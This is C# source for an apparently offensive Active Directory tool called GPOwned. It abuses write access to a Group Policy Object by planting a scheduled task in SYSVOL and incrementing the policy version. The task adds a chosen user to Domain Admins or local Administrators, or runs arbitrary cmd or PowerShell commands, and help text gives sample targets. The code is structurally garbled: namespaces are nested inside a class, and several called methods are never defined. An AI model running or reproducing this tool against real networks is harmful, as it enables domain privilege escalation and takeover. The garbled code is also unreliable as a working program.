namespace GPOwned
{
    public partial class GPOwned
    {
        using System;
        using System.DirectoryServices;
        using System.DirectoryServices.AccountManagement;
        using System.IO;
        using System.Net.Http;
        using System.Threading.Tasks;
        using System.Xml;
        using Microsoft.Win32.TaskScheduler;
        using System.Security.Principal;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Threading;

        namespace GPOwned
        {
            public class GPOwnedOptions
            {
                public string GPOGUID { get; set; }
                public string ScheduledTasksXMLPath { get; set; }
                public string User { get; set; }
                public string Author { get; set; }
                public string Domain { get; set; }
                public string Computer { get; set; }
                public bool Help { get; set; }
                public bool DA { get; set; }
                public bool Local { get; set; }
                public string LoadDLL { get; set; }
                public string CMD { get; set; }
                public string PowerShell { get; set; }
                public string SecondTaskXMLPath { get; set; }
                public string SecondXMLCMD { get; set; }
                public string SecondPowerShell { get; set; }
                public string Log { get; set; }
            }

            public class ConsoleLogger
            {
                public static void WriteSuccess(string message)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] {message}");
                    Console.ResetColor();
                }

                public static void WriteError(string message)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] {message}");
                    Console.ResetColor();
                }

                public static void WriteInfo(string message)
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine($"[*] {message}");
                    Console.ResetColor();
                }
            }

            public class GPOwned
            {
                private readonly GPOwnedOptions _options;
                private readonly string _domainDN;
                private readonly string _dc;
                private readonly HttpClient _httpClient;
                private StreamWriter _logWriter;
                private const string ExtensionString = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";

                public GPOwned(GPOwnedOptions options)
                {
                    _options = options;
                    _httpClient = new HttpClient();
                    
                    if (!string.IsNullOrEmpty(_options.Log))
                    {
                        _logWriter = new StreamWriter(_options.Log, true);
                    }

                    // Initialize domain info
                    if (string.IsNullOrEmpty(_options.Domain))
                    {
                        using var context = new PrincipalContext(ContextType.Domain);
                        _options.Domain = context.ConnectedServer;
                    }

                    // Get domain DN
                    using (var entry = new DirectoryEntry($"LDAP://{_options.Domain}"))
                    {
                        _domainDN = entry.Properties["distinguishedName"].Value.ToString();
                    }

                    // Get DC
                    _dc = _options.Computer ?? GetDomainController();
                }

                private string GetDomainController()
                {
                    using var context = new PrincipalContext(ContextType.Domain);
                    return context.ConnectedServer;
                }

                public void Dispose()
                {
                    _logWriter?.Dispose();
                    _httpClient?.Dispose();
                }

                private void Log(string message)
                {
                    if (_logWriter != null)
                    {
                        _logWriter.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {message}");
                        _logWriter.Flush();
                    }
                }

                public void ShowHelp()
                {
                    var help = @"
Invoke-GPOwned Help:

Examples: 
- GPO Linked to DC:
GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath "".\ScheduledTasks.xml"" -User UserToElevate -Computer dc01.noteasy.local

- GPO Linked to a workstation:
GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath "".\ScheduledTasks.xml"" -User UserToElevate -Computer pc01.noteasy.local -Local

Parameters:
-GPOGUID: Group Policy GUID
-ScheduledTasksXMLPath: Full path to the ScheduledTasks xml file
-SecondTaskXMLPath: Using the wsadd.xml file for additional commands
-Computer: Target computer
-Local: Adds a chosen user to the local administrators group
-DA: Adds the user to the domain admins group
-CMD: Execute a custom cmd command
-PowerShell: Execute a custom powershell command
-User: Target user to elevate
-Domain: Target domain
-LoadDLL: Load the ActiveDirectory DLL from custom path
-Log: Log output to file
";
                    Console.WriteLine(help);
                }

                public async Task Execute()
                {
                    try
                    {
                        if (_options.Help || string.IsNullOrEmpty(_options.GPOGUID) || 
                            string.IsNullOrEmpty(_options.ScheduledTasksXMLPath) || 
                            string.IsNullOrEmpty(_options.Computer))
                        {
                            ShowHelp();
                            return;
                        }

                        // Validate XML files
                        if (!ValidateXMLFiles())
                            return;

                        // Get initial GPO state
                        var initialExtensions = GetGPOExtensions();
                        
                        // Process GPO modifications
                        await ProcessGPOModifications(initialExtensions);

                        // Wait for changes and verify
                        await WaitForChangesAndVerify();

                        // Cleanup
                        await CleanupGPO(initialExtensions);
                    }
                    catch (Exception ex)
                    {
                        ConsoleLogger.WriteError($"Error during execution: {ex.Message}");
                        Log($"Error: {ex}");
                    }
                }

                private bool ValidateXMLFiles()
                {
                    if (!ValidateXMLFile(_options.ScheduledTasksXMLPath))
                    {
                        ConsoleLogger.WriteError("Primary XML file not found or invalid!");
                        return false;
                    }

                    if (!string.IsNullOrEmpty(_options.SecondTaskXMLPath) && !ValidateXMLFile(_options.SecondTaskXMLPath))
                    {
                        ConsoleLogger.WriteError("Second XML file not found or invalid!");
                        return false;
                    }

                    ConsoleLogger.WriteSuccess("XML files validated successfully.");
                    return true;
                }

                private bool ValidateXMLFile(string path)
                {
                    if (!File.Exists(path))
                        return false;

                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.Load(path);
                        return xmlDoc.DocumentElement != null;
                    }
                    catch
                    {
                        return false;
                    }
                }

                private string GetGPOExtensions()
                {
                    try
                    {
                        using var entry = new DirectoryEntry($"LDAP://CN={_options.GPOGUID},CN=Policies,CN=System,{_domainDN}");
                        return entry.Properties["gPCMachineExtensionNames"].Value?.ToString() ?? string.Empty;
                    }
                    catch
                    {
                        return string.Empty;
                    }
                }

                private async Task ProcessGPOModifications(string initialExtensions)
                {
                    // Create SYSVOL directory structure
                    var sysvolPath = $@"\\{_options.Domain}\SYSVOL\{_options.Domain}\Policies\{_options.GPOGUID}\Machine\Preferences\ScheduledTasks";
                    Directory.CreateDirectory(sysvolPath);

                    // Backup existing XML if present
                    var xmlPath = Path.Combine(sysvolPath, "ScheduledTasks.xml");
                    if (File.Exists(xmlPath))
                    {
                        File.Copy(xmlPath, $"{xmlPath}.old", true);
                        ConsoleLogger.WriteInfo("Created backup of existing ScheduledTasks.xml");
                    }

                    // Copy and modify XML files
                    await ModifyAndCopyXMLFiles(sysvolPath);

                    // Update GPO version
                    IncrementGPOVersion();

                    // Update extensions
                    UpdateGPOExtensions(initialExtensions);
                }

                private async Task ModifyAndCopyXMLFiles(string sysvolPath)
                {
                    var xmlContent = await File.ReadAllTextAsync(_options.ScheduledTasksXMLPath);
                    
                    // Replace placeholders
                    xmlContent = xmlContent
                        .Replace("changedomain", _options.Domain)
                        .Replace("changeuser", _options.Author ?? GetActiveDomainAdmin())
                        .Replace("changedc", _dc);

                    if (_options.DA)
                    {
                        var command = $"/r net group \"Domain Admins\" {_options.User} /add /dom";
                        xmlContent = xmlContent.Replace("argumentspace", command);
                    }
                    else if (_options.Local)
                    {
                        var command = $"/r net localgroup Administrators {_options.User} /add";
                        xmlContent = xmlContent.Replace("argumentspace", command);
                    }
                    else if (!string.IsNullOrEmpty(_options.PowerShell))
                    {
                        xmlContent = xmlContent
                            .Replace("cmd.exe", "powershell.exe")
                            .Replace("argumentspace", $"-Command {_options.PowerShell}");
                    }
                    else if (!string.IsNullOrEmpty(_options.CMD))
                    {
                        xmlContent = xmlContent.Replace("argumentspace", $"/r {_options.CMD}");
                    }

                    await File.WriteAllTextAsync(Path.Combine(sysvolPath, "ScheduledTasks.xml"), xmlContent);

                    // Handle second XML if present
                    if (!string.IsNullOrEmpty(_options.SecondTaskXMLPath))
                    {
                        await ProcessSecondaryXML(sysvolPath);
                    }
                }

                private string GetActiveDomainAdmin()
                {
                    if (!string.IsNullOrEmpty(_options.Author))
                        return _options.Author;

                    using var context = new PrincipalContext(ContextType.Domain);
                    using var group = GroupPrincipal.FindByIdentity(context, "Domain Admins");
                    
                    return group.GetMembers()
                        .Cast<UserPrincipal>()
                        .FirstOrDefault(u => u.Enabled == true)
                        ?.SamAccountName;
                }

                private void IncrementGPOVersion()
                {
                    var gptIniPath = $@"\\{_options.Domain}\SYSVOL\{_options.Domain}\Policies\{_options.GPOGUID}\GPT.INI";
                    var lines = File.ReadAllLines(gptIniPath);
                    
                    for (var i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].StartsWith("Version"))
                        {
                            var version = int.Parse(lines[i].Split('=')[1]);
                            lines[i] = $"Version={version + 1}";
                            break;
                        }
                    }

                    File.WriteAllLines(gptIniPath, lines);
                    
                    // Update AD version
                    using var entry = new DirectoryEntry($"LDAP://CN={_options.GPOGUID},CN=Policies,CN=System,{_domainDN}");
                    var currentVersion = (int)entry.Properties["versionNumber"].Value;
                    entry.Properties["versionNumber"].Value = currentVersion + 1;
                    entry.CommitChanges();
                }

                private void UpdateGPOExtensions(string initialExtensions)
                {
                    using var entry = new DirectoryEntry($"LDAP://CN={_options.GPOGUID},CN=Policies,CN=System,{_domainDN}");
                    entry.Properties["gPCMachineExtensionNames"].Value = ExtensionString + initialExtensions;
                    entry.CommitChanges();
                }
            }
        }
    }
}